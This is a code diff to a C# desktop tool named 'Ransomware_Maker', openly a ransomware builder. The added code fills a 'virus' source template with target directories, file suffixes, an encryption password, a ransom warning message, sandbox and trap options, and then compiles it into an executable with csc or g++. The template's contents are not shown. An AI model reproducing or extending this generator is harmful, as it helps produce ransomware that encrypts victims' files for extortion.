@@ -19,7 +19,7 @@ namespace Ransomware_Maker.cs
         {
             InitializeComponent();
         }
-        private static string GetCscCompiler(string bit= "Framework")
+        private static string GetCscCompiler(string bit = "Framework")
         {
             string frameworkPath = $"C:\\Windows\\Microsoft.NET\\{bit}\\";
             if (!Directory.Exists(frameworkPath))
@@ -44,7 +44,6 @@ namespace Ransomware_Maker.cs
                 temp[version] = parts[4];
             }
 
-            Console.WriteLine(temp);
             string selectedCompiler = temp[temp.Keys.Max()];
 
             return frameworkPath + selectedCompiler + "\\csc.exe";
@@ -54,11 +53,11 @@ namespace Ransomware_Maker.cs
             chk_64bit.IsEnabled = false;
             OpenFileDialog openFileDialog = new()
             {
-                Filter = "Executable Files|gcc.exe",
-                Title = "Compiler for MinGW-w64 GCC that supports c++17"
+                Filter = "Executable Files|g++.exe",
+                Title = "Compiler for MinGW-w64 GCC that supports c++11"
             };
 
-            if (openFileDialog.ShowDialog()==true)
+            if (openFileDialog.ShowDialog() == true)
             {
                 string selectedFileName = openFileDialog.FileName;
                 lbl_compiler.Content = selectedFileName;
@@ -93,23 +92,154 @@ namespace Ransomware_Maker.cs
         }
 
         private void Btn_generate_Click(object sender, RoutedEventArgs e)
-        {/*
-            if ((bool)rdb_cs.IsChecked)
+        {
+            string lang = rdb_cs.IsChecked.Value? "c#" : "c++";
+            string suffix = lang == "c#" ? "cs" : "cc";
+            string? path = GenerateCode(lang == "c#" ? "virus.cs" : "virus.cc", suffix);
+            if(path == null )
             {
-
+                MessageBox.Show("An error occurred while generating the code", Title, MessageBoxButton.OK, MessageBoxImage.Error);
             }
-        */
+            bool smallest = chk_resize.IsChecked.Value;
+            string outputOption = lang switch
+            {
+                "c#" => " /out:virus.exe ",
+                "c++" => " -o virus ",
+            };
+            string cmd = $"{lbl_compiler.Content} {outputOption} {path} {AddArgv(lang,smallest)} ";
+            Clipboard.SetText(cmd);
+            string result = ExecCmd(cmd);
+            if (string.Empty == result)
+            {
+                MessageBox.Show("Compiled successfully", Title, MessageBoxButton.OK, MessageBoxImage.Information);
+            }else
+            {
+                MessageBox.Show(result, Title, MessageBoxButton.OK, MessageBoxImage.Error);
+            }
+        }
+        static string AddArgv(string langType, bool smallest)
+        {
+            string result = langType switch
+            {
+                "c#" => "",
+                "c++" => " -static ",
+            };
+
+            if (smallest)
+            {
+                result += langType switch
+                {
+                    "c#" => " /optimize /debug- ",
+                    "c++" => " -s ",
+                };
+            }
+
+
+            return result;
         }
 
+        static string ExecCmd(string cmd)
+            {
+                ProcessStartInfo psi = new ProcessStartInfo
+                {
+                    FileName = "cmd.exe",
+                    RedirectStandardOutput = true,
+                    RedirectStandardError = true,
+                    UseShellExecute = false,
+                    CreateNoWindow = true,
+                    Arguments = "/c " + cmd
+                };
+
+            using Process process = new();
+            process.StartInfo = psi;
+            process.Start();
+            string output = process.StandardError.ReadToEnd() + process.StandardOutput.ReadToEnd();
+            process.WaitForExit();
+            if (process.ExitCode != 0)
+            {
+                return output;
+            }
+            return string.Empty;
+        }
+
+    private string? GenerateCode(string path,string suffix)
+        {
+            string data = "";
+            try
+            {
+                using (StreamReader reader = new StreamReader(path))
+                {
+                    data = reader.ReadToEnd();
+                }
+            }
+            catch
+            {
+                return null;
+            }
+
+            string[] suffixes = tbox_suffix_list.Text.Split(",");
+            string formattedSuffixes = string.Join(",", suffixes.Select(suffix => $"\"{suffix.Trim()}\""));
+
+            string encryptedSuffixes = tbox_suffix.Text;
+            string password = tbox_password.Text;
+            string input = Microsoft.VisualBasic.Interaction.InputBox("Please fill in the path group to be encrypted (like c:/path,d:/path)","","c:/");
+
+            if (string.IsNullOrEmpty(input))
+            {
+                MessageBox.Show("Path cannot be empty", Title ,MessageBoxButton.OK, MessageBoxImage.Error);
+                return null;
+            }
+            string[] directories = input.Split(",");
+            string formattedDirectories = string.Join(",", directories.Select(directory => $"\"{directory.Trim()}\""));
+            static string lambdaFunction(bool x) => x ? "true" : "false";
+            string msg = tbox_warning.Text;
+            string sandbox = lambdaFunction(chk_sandbox.IsChecked.Value);
+            string trap = lambdaFunction(chk_trap.IsChecked.Value);
+
+            Tuple<string, string>[] replacements = new Tuple<string, string>[]
+            {
+                new Tuple<string, string>(formattedSuffixes, "#SUFFIES#"),
+                new Tuple<string, string>($"\"{encryptedSuffixes}\"", "#ENCRYPTED_SUFFIX#"),
+                new Tuple<string, string>($"{Escape(password)}", "#PASSWORD#"),
+                new Tuple<string, string>($"{Escape(formattedDirectories)}", "#DIRECTORIES#"),
+                new Tuple<string, string>($"{Escape(msg)}", "#MSG#"),
+                new Tuple<string, string>(sandbox, "#SANDBOX#"),
+                new Tuple<string, string>(trap, "#TRAP#")
+            };
+
+            foreach (Tuple<string, string> replacement in replacements)
+            {
+                data = data.Replace(replacement.Item2, replacement.Item1);
+            }
+
+            string randomStr = new string(Enumerable.Repeat("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ", 6)
+                .Select(s => s[new Random().Next(s.Length)]).ToArray());
+
+            string tempPath = Path.GetTempPath();
+
+            string filePath = Path.Combine(tempPath, $"{randomStr}.{suffix}");
+
+            using (StreamWriter writer = new StreamWriter(filePath))
+            {
+                writer.Write(data);
+            }
+            return filePath;
+        }
+
+        static string Escape(string s)
+        {
+            return "\"" + s.Replace("\"", "\\\"").Replace("\n", "\\n") + "\"";
+        }
         private void Chk_64bit_Checked(object sender, RoutedEventArgs e)
         {
-                lbl_compiler.Content = GetCscCompiler("Framework64");
+            lbl_compiler.Content = GetCscCompiler("Framework64");
         }
 
         private void Chk_64bit_Unchecked(object sender, RoutedEventArgs e)
         {
             lbl_compiler.Content = GetCscCompiler();
         }
+
     }
 
 
